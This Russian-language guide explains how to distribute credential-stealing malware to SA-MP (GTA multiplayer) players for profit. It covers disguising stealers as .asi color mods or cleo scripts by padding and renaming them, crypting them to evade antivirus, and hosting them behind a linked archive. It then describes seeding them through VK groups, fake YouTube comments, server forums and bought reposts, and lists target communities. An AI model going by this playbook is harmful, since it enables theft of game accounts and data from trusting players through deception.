Автор гайда - Степан Тимошенко.

Мой вам совет,возьмите стиллер(asi/sf) и к нему криптовку,так вы сможете очень хорошо распиарить свою ПУ.

Многие задаются вопросом, как же распиарить стиллер,если бюджет не больше 150 рублей или денег вообще нет. Всё просто,читай ниже.

Аси - Луший в использовании, просто кидаешь в корневую папку с игрой и всё. многих смущает размер файла, мол 100 кб много, почти все программы не палят, он даже без клео и сф прекрасно функционирует. С помощью программы HxD к файлу добавляем 8 - 9 кб, чтоб вышло 109, переменуем под colormod - получаем colormod.asi - готово, не забудьте основные файла colormod`a добавить в архив, colormod.ini и тд.

Ух. самое сочное, столько наивных людей которые качают) Нам нужен будет стилл .sf Скачать Архив("Кряк Гонщика") - https://yadi.sk/d/VhA77XyA3YwY2E ( Все файлы в .sf меняйте под себя, если что в архиве оригинальные файлы гонщика ) Оформите всё грамотно, можете так же кидать по пабликам вк или же по ютюбу, так же пробывать кидать ютюберам или же пробывать заливать на сайты.

Заходите по пабликам ВК - кидаете в предложку, красиво оформляете, сильно не расписывайте - вызовет подозрения. Я лья стиллеры в группы успел стать редактором, от активности, по кд лить не надо. Так же пишите Адм. групп что желаете стать редактором, имеете опыт и тд., напишите что были редактором в Хокаге(к примеру), куча свободного времени ищу новые связи в самп. - ПРОФИТ! На одних колормодах выехать не получиться, заливайте клео gps, ну придумайте уникальное.

Самое эффективное, этим способ наформил очень много логов. В роликах по гта, где заливают на SetQuest - пишите в комментариях " Залил без сетквеста - " https// Ваша ссылка с вашим стиллом ". Так же где заливаю на сокращённые ссылки и тд., проявляйте смекалку. К примеру : " Он залил со стиллером, вот без стиллера братья - https//... ".

Так же можно пиарить на форумах серверов. Для этого подойдет, и cleo, и asi. Оформляете описание,заливаете на яндекс диск. ПРИМЕР: Cleo FASTCONNECT Этот скрипт поможет вам подключаться быстро к серверу. Ссылка - " https// Ваша ссылка с вашим стиллером " Удачной игры на проекте. Таким способом если не лениться можно за день нафармить 300-500 строк.

Еще не плохой способ,создаете паблик в вконтакте с названием " Читы/Cleo/Моды для Samp 0.3.7 " Накручиваете подписчиков 50-200, можете больше, если накрутить много подписчиков,то группа начнет сама раскручиваться,так как люди ищут по такому запросу группы, Делаете оформление,заказываете рекламу и льете туда свои стиллеры.

Вы можете зайти в гугл и набрать в запросе "Аим для сампа" И искать сайты,которые не сильно популярные,но запрос в топе и кидать им свои стиллеры

Очень хороший способо,сам им пользуюсь. Создаем группу(если есть,то не надо) накручиваем до 50 подписчиков,оформляем,делаем пост со стиллером и заказываем репост у какого-нибудь паблика Главное брать репост у пабликов с хорошим активом и чтобы было не сильно дорого

Группы,которые могут залить ваш стиллер,если красиво оформить: vk.com/daynmods vk.com/clancassetti vk.com/funnysampec vk.com/bennettsquad - 10 руб стоит пост,можете написать им. vk.com/rns_sw